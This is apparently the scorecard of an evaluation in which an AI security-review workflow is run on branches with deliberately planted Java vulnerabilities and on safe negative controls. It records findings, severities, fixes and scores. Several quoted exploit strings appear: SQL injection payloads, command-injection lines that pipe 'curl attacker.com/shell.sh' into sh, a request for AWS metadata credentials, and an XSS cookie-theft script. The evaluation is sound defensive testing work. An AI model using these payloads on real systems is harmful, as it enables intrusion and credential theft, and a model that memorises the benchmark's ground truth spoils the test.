# `/security-review` evaluation — scorecard

Phase 1 scope: **Claude-only.** Cross-model comparison (Claude vs ChatGPT)
is deferred to phase 2.

One row per test branch. Each `vuln/<class>` branch gets a PR against
`main`; the GitHub Actions workflow runs `/security-review` automatically
and posts findings as PR comments. Ground truth per class lives at
[`eval/expected/<class>.md`](./expected/).

Columns:
- **Flagged:** TP = caught (true positive); FN = missed (false negative);
  TN = safe code correctly left alone (true negative).
  Parenthetical count = number of distinct findings reported (or, on the
  negative-controls branch, the count of safe patterns correctly skipped).
- **Severity (expected -> got):** compare claim vs ground truth.
- **Fix quality:** Good / Partial / Wrong / None — does the suggested
  remediation actually fix the bug, is it minimal, no new issues?
- **False positives:** anything flagged in this run that isn't a real issue.
- **Bonus findings:** true positives the review caught that weren't the
  planned vuln for this branch (e.g., missing auth, logging a secret).

## Summary

| # | Class | Branch | PR | Flagged | Severity (expected -> got) | Fix quality | False positives | Bonus findings | Notes |
|---|---|---|---|---|---|---|---|---|---|
| 1 | SQL injection | `vuln/sql-injection` | [#1](https://github.com/DrivetrainAi/test-security/pull/1) | TP (2) | HIGH -> HIGH | Good | 0 | Missing auth on `/users/search-advanced` | Caught both `filter` and `orderBy` sinks as separate findings; noted the sibling `findByName` correctly uses parameterized queries |
| 2 | Command injection | `vuln/command-injection` | [#3](https://github.com/DrivetrainAi/test-security/pull/3) | TP (1) | HIGH -> HIGH | Good | 0 | Missing auth on `/ops/ping` | Caught `Runtime.exec` concatenation; flag-injection variant pre-empted in exploit scenario (`host=-c+1000+...`); recs include hostname allowlist regex, ProcessBuilder array form, and `InetAddress.isReachable()` as architectural alternative |
| 3 | Path traversal | `vuln/path-traversal` | [#10](https://github.com/DrivetrainAi/test-security/pull/10) |  |  |  |  |  |  |
| 4 | Insecure deserialization | `vuln/deserialization` | [#17](https://github.com/DrivetrainAi/test-security/pull/17) |  |  |  |  |  |  |
| 5 | XXE | `vuln/xxe` | [#16](https://github.com/DrivetrainAi/test-security/pull/16) |  |  |  |  |  |  |
| 6 | Hardcoded credentials | `vuln/hardcoded-secrets` | [#11](https://github.com/DrivetrainAi/test-security/pull/11) |  |  |  |  |  |  |
| 7 | Weak crypto | `vuln/weak-crypto` | [#12](https://github.com/DrivetrainAi/test-security/pull/12) |  |  |  |  |  |  |
| 8 | SSRF | `vuln/ssrf` | [#13](https://github.com/DrivetrainAi/test-security/pull/13) |  |  |  |  |  |  |
| 9 | XSS | `vuln/xss` | [#15](https://github.com/DrivetrainAi/test-security/pull/15) |  |  |  |  |  |  |
| 10 | Log injection | `vuln/log-injection` | [#14](https://github.com/DrivetrainAi/test-security/pull/14) |  |  |  |  |  |  |
| 11 | Command injection — argv (depth probe) | `vuln/command-injection-argv` | [#4](https://github.com/DrivetrainAi/test-security/pull/4) | TP (3) | HIGH -> HIGH | Good | 0 | SSRF and auth-bypass as their own structured findings; CSRF-via-GET reasoning | Explicitly rebutted the "safe from injection" docblock; named both `ext::` transport and `--upload-pack=` flag injection; recommended `--` separator + scheme allowlist + `protocol.ext.allow=never` env hardening |
| — | Negative controls | `safe/negative-controls` | [#5](https://github.com/DrivetrainAi/test-security/pull/5) | TN (10/10) | n/a | n/a (no fix needed) | 0 | n/a | All 10 safe-but-suspicious patterns correctly left alone — including the typically FP-prone MD5-for-ETag and Stripe `pk_test_` literal. Strong signal that the review reads semantic context (comments, usage) rather than pattern-matching on tokens |

### Running tally (3 vuln tests + 1 negative-controls branch complete)

- **True positives on planted vulns:** 3 / 3
- **False negatives on planted vulns:** 0 / 3
- **Severity accuracy (got == expected):** 3 / 3
- **Fix quality == Good:** 3 / 3
- **False positive rate on `safe/negative-controls`:** **0 / 10**
- **Bonus TPs caught:** missing-auth on all 3 vuln endpoints (consistent contextual reasoning); SSRF + CSRF-via-GET on test #11

### Aggregate scores (final, fill in once all 11 vuln runs are complete)

- **True positives:** _ / 11
- **False negatives:** _ / 11
- **Severity accuracy (got == expected):** _ / 11
- **Fix quality == Good:** _ / 11
- **False positives on `safe/negative-controls`:** 0 / 10 (locked in)

---

## Per-test notes

### 1. SQL injection — `vuln/sql-injection` (PR [#1](https://github.com/DrivetrainAi/test-security/pull/1))

**Expected** (see [`eval/expected/sql-injection.md`](./expected/sql-injection.md)):
- `UserDao.findByFilter` concatenates the `filter` parameter into a raw SQL
  WHERE clause — classic string-concatenation SQL injection.
- `UserDao.findByFilter` also concatenates `orderBy` into the ORDER BY
  clause — second SQL injection sink in the same method.
- Expected severity for both: **HIGH**.

**Actual — findings from the workflow's PR comment:**

1. **`filter` -> WHERE clause** — HIGH — category `sql_injection`.
   Claude explicitly contrasted against the sibling `findByName` (which uses
   `?` placeholders correctly) and called out that `/users/search-advanced`
   is reachable with no auth (Spring Security absent). Exploit scenario:
   `/users/search-advanced?filter=1=1 UNION SELECT password FROM users--`
   -> UNION-based exfiltration. Recommendation: query-builder / criteria API
   with allowlisted fields and parameterized predicates; at minimum put the
   endpoint behind auth + parameterize.

2. **`orderBy` -> ORDER BY clause** — HIGH — category `sql_injection`.
   Reasoned correctly that ORDER BY injection is normally lower-impact but
   in this project the H2 database supports stacked queries, escalating it
   to full SQLi. Exploit scenario: blind SQLi via
   `orderBy=(CASE WHEN (SELECT substring(password,1,1) FROM users LIMIT 1)='a' THEN name ELSE username END)`.
   Recommendation: allowlist of permitted column names with concrete code
   (`Map<String, String> ALLOWED = Map.of("name","name","username","username"); String safeOrder = ALLOWED.getOrDefault(orderBy, "name");`).

**Score:**
- Flagged: TP on both sinks (distinct findings).
- Severity: HIGH == HIGH on both. Accurate.
- Fix quality: **Good.** Concrete, minimal, idiomatic. Bonus points for
  the ORDER BY allowlist code snippet and the H2-stacked-queries reasoning.
- False positives: 0.
- Bonus findings: missing authentication / authorization on
  `/users/search-advanced`. Out-of-scope for the planned vuln but a real
  true positive — the kind of contextual finding that matters.

**Links:**
- PR: https://github.com/DrivetrainAi/test-security/pull/1
- Review comment: see PR conversation

### 2. Command injection — `vuln/command-injection` (PR [#3](https://github.com/DrivetrainAi/test-security/pull/3))

**Expected** (see [`eval/expected/command-injection.md`](./expected/command-injection.md)):
- `NetworkOpsController.ping` invokes `Runtime.getRuntime().exec("ping -c 2 " + host)` —
  user-controlled `host` concatenated into a single-string exec call.
- Endpoint `/ops/ping` is unauthenticated (no Spring Security).
- Expected severity: **HIGH**.

**Actual — finding from the workflow's PR comment:**

1. **`host` -> Runtime.exec single-string** — HIGH — category `command_injection`.
   Reasoning correctly distinguished the `exec(String)` whitespace-tokenization
   semantics (no shell on most JVMs) from the practical risk: argument
   injection to `ping`, plus shell delegation on certain JDKs/JREs when
   metacharacters are present. Exploit scenarios offered:
   - `?host=127.0.0.1%0acat%20/etc/passwd` — newline + shell delegation case
   - `?host=;curl+attacker.com/shell.sh|sh` — shell metacharacter chain
   - `?host=-c+1000+127.0.0.1+-s+65500` — pure flag injection (DoS via
     ping flood / large packets), no shell required
   Spotted that `/ops/ping` is unauthenticated and that the TODO on line 14
   confirms it is intentionally not yet locked down. Recommendations:
   1. Strict hostname regex allowlist (`^[a-zA-Z0-9.\-]+$`) — this is the
      actual fix that closes the bug.
   2. Use the array form of ProcessBuilder
      (`new ProcessBuilder("ping", "-c", "2", host)`).
   3. Add auth/authz immediately, even behind a VPN.
   4. Consider whether `InetAddress.isReachable()` would suffice instead of
      shelling out.

**Score:**
- Flagged: TP — caught with the right CWE class.
- Severity: HIGH == HIGH. Accurate.
- Fix quality: **Good.** Hostname regex allowlist is the right minimal fix;
  `InetAddress.isReachable()` is an excellent architectural alternative.
  Minor inconsistency: the recommendation to "use the array form of
  ProcessBuilder" is presented as a fix, but Claude's own exploit scenario
  (`host=-c+1000+...`) shows the array form is still flag-injectable. Did
  not warn about that gap when recommending it. Test #11 (variant C) will
  probe whether Claude catches the flag-injection-on-array-form pattern
  when presented in isolation.
- False positives: 0.
- Bonus findings: missing authentication on `/ops/ping` — consistent with
  the same bonus call on PR #1, suggesting reliable contextual reasoning
  about endpoint exposure.

**Links:**
- PR: https://github.com/DrivetrainAi/test-security/pull/3
- Review comment: see PR conversation

### 3. Path traversal — `vuln/path-traversal` (PR [#10](https://github.com/DrivetrainAi/test-security/pull/10))

**Expected** (see [`eval/expected/path-traversal.md`](./expected/path-traversal.md)):
- `FileController.download` concatenates `filename` from `@RequestParam` directly into
  `Paths.get(REPORTS_DIR + filename)` with no `normalize()` or `startsWith()` guard —
  classic path traversal (CWE-22).
- Endpoint `/files/download` is unauthenticated (Javadoc TODO confirms this).
- Expected severity for the traversal: **HIGH**.

**Actual:** _pending scanner run_

---

### 4. Insecure deserialization — `vuln/deserialization` (PR [#17](https://github.com/DrivetrainAi/test-security/pull/17))

**Expected** (see [`eval/expected/deserialization.md`](./expected/deserialization.md)):
- `SessionController.restore` decodes the `X-Session-Token` HTTP header and passes
  the bytes to `ObjectInputStream.readObject()` with no `ObjectInputFilter` allowlist.
- Javadoc claims "load balancer verifies the signature" as mitigation — the reviewer
  must rebut this (gadget chains bypass it; direct VPC access bypasses the LB).
- Expected severity: **CRITICAL**.

**Actual:** _pending scanner run_

---

### 5. XXE — `vuln/xxe` (PR [#16](https://github.com/DrivetrainAi/test-security/pull/16))

**Expected** (see [`eval/expected/xxe.md`](./expected/xxe.md)):
- `InvoiceController.upload` parses caller-supplied XML with a bare
  `DocumentBuilderFactory.newInstance()` — no features disabled, DTD/external-entity
  processing at insecure JDK defaults.
- `file:///etc/passwd` exfiltration via SYSTEM entity; response body returns contents
  directly (non-blind).
- Expected severity: **HIGH**.

**Actual:** _pending scanner run_

---

### 6. Hardcoded credentials — `vuln/hardcoded-secrets` (PR [#11](https://github.com/DrivetrainAi/test-security/pull/11))

**Expected** (see [`eval/expected/hardcoded-secrets.md`](./expected/hardcoded-secrets.md)):
- `PaymentService` hardcodes a Stripe `sk_live_` secret key, a `whsec_` webhook
  signing secret, and an HS256 JWT symmetric key in static fields (CWE-798/321).
- The `charge()` method also logs the Stripe secret key via SLF4J (CWE-532).
- Expected severity: **CRITICAL** on the three credential fields, **HIGH** on the
  log-disclosure.

**Actual:** _pending scanner run_

---

### 7. Weak crypto — `vuln/weak-crypto` (PR [#12](https://github.com/DrivetrainAi/test-security/pull/12))

**Expected** (see [`eval/expected/weak-crypto.md`](./expected/weak-crypto.md)):
- `PasswordService.hashPassword` uses `MessageDigest.getInstance("MD5")` with no
  salt for password storage (CWE-328 + CWE-759). Javadoc comment claims "salt not
  needed" — the reviewer must rebut this.
- `PasswordService.generateResetToken` uses `java.util.Random` seeded with
  `System.currentTimeMillis()` for a security-sensitive token (CWE-338).
- Expected severity: **HIGH** on both.

**Actual:** _pending scanner run_

---

### 8. SSRF — `vuln/ssrf` (PR [#13](https://github.com/DrivetrainAi/test-security/pull/13))

**Expected** (see [`eval/expected/ssrf.md`](./expected/ssrf.md)):
- `WebhookController.test` passes `url` from `@RequestParam` directly to
  `new URL(url).openConnection()` with no scheme/host/port validation (CWE-918).
- Response body returned verbatim — non-blind SSRF; AWS instance metadata
  (`http://169.254.169.254/...`) and `file://` scheme both exploitable.
- Expected severity: **HIGH**.

Note: PR #4 surfaced an SSRF finding on the `vuln/command-injection-argv` branch
as a bonus TP — this dedicated test scores on a clean single-class branch.

**Actual:** _pending scanner run_

---

### 9. XSS — `vuln/xss` (PR [#15](https://github.com/DrivetrainAi/test-security/pull/15))

**Expected** (see [`eval/expected/xss.md`](./expected/xss.md)):
- `SearchController.search` reflects `q` from `@RequestParam` directly into an
  HTML response body via string concatenation, with `Content-Type: text/html`
  and no `HtmlUtils.htmlEscape()` call (CWE-79).
- Reflected XSS; exploit: `?q=<script>document.location=...+document.cookie</script>`.
- Expected severity: **HIGH**.

**Actual:** _pending scanner run_

---

### 10. Log injection — `vuln/log-injection` (PR [#14](https://github.com/DrivetrainAi/test-security/pull/14))

**Expected** (see [`eval/expected/log-injection.md`](./expected/log-injection.md)):
- `AuthController.login` uses `+` string concatenation in all three `log.*` calls
  instead of SLF4J `{}` placeholder form (CWE-117).
- Allows newline injection to forge log entries:
  `?username=alice%0aLogin+SUCCESS+for+user:+admin`.
- Expected severity: **MEDIUM**.

**Actual:** _pending scanner run_

### 11. Command injection — argv (depth probe) — `vuln/command-injection-argv` (PR [#4](https://github.com/DrivetrainAi/test-security/pull/4))

**Expected** (see [`eval/expected/command-injection-argv.md`](./expected/command-injection-argv.md)):
- `GitMirrorController.mirror` invokes `git clone <url> /tmp/mirror` via
  `ProcessBuilder` argv list — user-controlled `url` is one argv element.
  The docblock explicitly claims the array form makes this safe, which is
  the bait this test exists to challenge.
- Expected severity: **HIGH**.
- Expected reasoning depth: review must explicitly rebut the "safe from
  injection" claim AND name at least one specific flag-injection vector
  (`--upload-pack=...` or `ssh://-oProxyCommand=...` family or `ext::`
  transport) to count as a deep-pass; otherwise it's a partial pass.

**Actual — three findings from the workflow's PR comment:**

1. **RCE via git `ext::` transport + `--upload-pack` argument injection** —
   HIGH — category `command_injection`. Directly rebuts the docblock:
   *"The Javadoc's claim that 'the URL is just data to git' is incorrect —
   git actively interprets URL schemes and option-like arguments."*
   Exploit scenarios:
   - `?url=ext::sh -c curl attacker.com/shell.sh|sh` invoking the `ext::`
     transport handler. Cites git's `protocol.ext.allow=user` policy
     (which permits `ext::` when on the command line).
   - `?url=--upload-pack=id` injecting an option that overrides the
     upload-pack program, executing arbitrary commands when `/tmp/mirror`
     already exists from a prior clone.
   Recommendations: scheme allowlist + reject leading `-`; `--` separator
   before positional args (`new ProcessBuilder("git", "clone", "--", url, "/tmp/mirror")`);
   environment hardening (`GIT_TERMINAL_PROMPT=0`, `-c protocol.ext.allow=never`).

2. **SSRF via unconstrained URL** — HIGH — category `ssrf`. Exploit
   scenarios: AWS instance metadata
   (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`)
   to steal IAM creds via git's combined stdout/stderr in the response
   body; internal-port probing via differential error messages;
   `file:///` scheme for local filesystem. Recommendations: HTTPS-only
   scheme, host allowlist (github.com, gitlab.com), block RFC 1918 +
   link-local + localhost.

3. **Unauthenticated dangerous endpoint / authorization bypass** —
   HIGH — category `authorization_bypass`. Notes there's no Spring
   Security in the project; cites the TODO on line 20. Adds CSRF angle:
   *"Since this is a GET endpoint, it can also be triggered via CSRF —
   `<img src='https://target/ops/mirror?url=ext::malicious'>`"*.
   Recommendations: `@PreAuthorize("hasRole('ADMIN')")`, switch to POST
   for state-changing operations.

**Score:**
- Flagged: TP — depth-pass on the planted vuln + 2 separate structured
  bonus findings.
- Severity: HIGH == HIGH on the planted finding. Accurate.
- Fix quality: **Good.** The `--` separator + scheme allowlist + env
  hardening combination is the most thorough remediation we've seen in
  the run so far. The CSRF-via-GET observation on the auth finding is
  sophisticated and not telegraphed by the source code.
- False positives: 0.
- Bonus findings: SSRF (will overlap with the planned dedicated SSRF
  branch) and authorization-bypass (consistent with the running pattern).

**Links:**
- PR: https://github.com/DrivetrainAi/test-security/pull/4
- Review comment: see PR conversation

### Negative controls — `safe/negative-controls` (PR [#5](https://github.com/DrivetrainAi/test-security/pull/5))

**Expected** (see [`eval/expected/negative-controls.md`](./expected/negative-controls.md)):
- 10 safe-but-suspicious-looking patterns in `SafeUtilsController.java`,
  each mimicking one planted-vuln class. The review should stay quiet on
  all 10. Any finding counts as a false positive.

**Actual:** zero findings posted by the workflow — TN on all 10.

**Score:**
- Flagged: TN — review correctly emitted no findings.
- Per-pattern breakdown (all correctly skipped):
  1. `/safe/user-by-name` — parameterized JDBC. ✅
  2. `/safe/uptime` — `Runtime.exec(String[])` with constant args. ✅
  3. `/safe/report` — allowlisted file read with `normalize` + `startsWith`. ✅
  4. `/safe/parse-xml` — fully hardened `DocumentBuilderFactory`. ✅
  5. `/safe/etag` — MD5 used for non-cryptographic content fingerprint
     (the docblock explicitly says it is not used for any security
     boundary). Strong test for context-reading; passed cleanly. ✅
  6. `/safe/new-session-token` — `SecureRandom` for token bytes. ✅
  7. `/safe/stripe-pk` — Stripe publishable test key (`pk_test_...`).
     Most secret scanners flag any `pk_test_` literal regardless of
     context; the docblock notes it is a publishable key documented as
     safe to commit. Strong test for noise-resistance; passed cleanly. ✅
  8. `/safe/health-upstream` — `URL` constructed from a hardcoded HTTPS
     literal, no user input. ✅
  9. `/safe/login-event` — SLF4J parameterized log (`{}` placeholder),
     no concatenation. ✅
  10. `/safe/echo` — `@RestController` returning a `Map<String, String>`,
      JSON-serialized; no HTML rendering surface. ✅
- False positive rate: **0 / 10.**

**Why this matters:** the most informative cells in this row are #5 (MD5
for ETag) and #7 (Stripe `pk_test_`). Both are pattern-match traps that
typical secret scanners and SAST tools FP on regardless of context. The
review reading the docblock + usage and staying silent is signal that it
is doing semantic context analysis, not surface pattern matching.
Caveat: 10 patterns is a small sample; later test branches may surface
FP-prone patterns we haven't probed here (e.g., `eval` in a sandbox,
GitHub Actions `pull_request_target`, etc.).

**Links:**
- PR: https://github.com/DrivetrainAi/test-security/pull/5

---

## Methodology

- One vulnerability per feature branch, branched off `main`.
- Each branch opens a PR against `main` so the GitHub Actions workflow
  (`.github/workflows/claude-security.yml`) runs `/security-review`
  automatically and posts findings as PR review comments.
- Ground truth per class lives at [`eval/expected/<class>.md`](./expected/) —
  {file, line, sink, expected severity} for each planted bug.
- Results recorded here before moving on to the next class.
- Vulnerabilities are **not** merged into `main` — branches stay open (or
  closed without merge) so `main` stays clean.
- Re-running after a fix commit is optional per class to confirm a clean pass.
